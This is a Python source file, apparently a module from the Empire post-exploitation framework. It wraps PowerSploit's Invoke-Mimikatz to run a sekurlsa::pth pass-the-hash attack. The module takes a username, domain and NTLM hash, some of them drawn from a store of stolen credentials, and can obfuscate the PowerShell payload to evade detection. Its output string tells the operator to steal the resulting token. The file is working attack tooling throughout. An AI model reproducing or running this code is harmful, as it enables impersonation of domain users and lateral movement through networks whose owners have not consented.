import os.path
from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Mimikatz PTH',

            'Author': ['@JosephBialek', '@gentilkiwi'],

            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
                            "to execute sekurlsa::pth to create a new process. "
                            "with a specific user's hash. Use credentials/tokens "
                            "to steal the token afterwards."),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : True,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',

            'Comments': [
                'http://clymb3r.wordpress.com/',
                'http://blog.gentilkiwi.com',
                'http://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use for ticket creation.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'user' : {
                'Description'   :   'Username to impersonate.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'domain' : {
                'Description'   :   'The fully qualified domain name.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ntlm' : {
                'Description'   :   'The NTLM hash to use.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        if obfuscate:
            moduleSource = self.mainMenu.installPath + "/data/obfuscated_module_source/credentials/Invoke-Mimikatz.ps1"
            if not self.is_obfuscated():
                self.obfuscate(obfuscationCommand=obfuscationCommand)
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # if a credential ID is specified, try to parse
        credID = self.options["CredID"]['Value']
        if credID != "":

            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""

            (credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
            if credType != "hash":
                print helpers.color("[!] An NTLM hash must be used!")
                return ""

            if userName != "":
                self.options["user"]['Value'] = userName
            if domainName != "":
                self.options["domain"]['Value'] = domainName
            if password != "":
                self.options["ntlm"]['Value'] = password

        if self.options["ntlm"]['Value'] == "":
            print helpers.color("[!] ntlm hash not specified")

        # build the custom command with whatever options we want
        command = "sekurlsa::pth /user:"+self.options["user"]['Value']
        command += " /domain:" + self.options["domain"]['Value']
        command += " /ntlm:" + self.options["ntlm"]['Value']

        # base64 encode the command to pass to Invoke-Mimikatz
        script += "Invoke-Mimikatz -Command '\"" + command + "\"'"

        script += ';"`nUse credentials/token to steal the token of the created PID."'

        return script

    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
        if self.is_obfuscated() and not forceReobfuscation:
            return

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        # obfuscate and write to obfuscated source path
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/credentials/Invoke-Mimikatz.ps1"
        obfuscatedCode = helpers.obfuscate(psScript=moduleCode, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        try:
            f = open(obfuscatedSource, 'w')
        except:
            print helpers.color("[!] Could not read obfuscated module source path at: " + str(obfuscatedSource))
            return ""
        f.write(obfuscatedCode)
        f.close()

    def is_obfuscated(self):
        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/credentials/Invoke-Mimikatz.ps1"
        return os.path.isfile(obfuscatedSource)
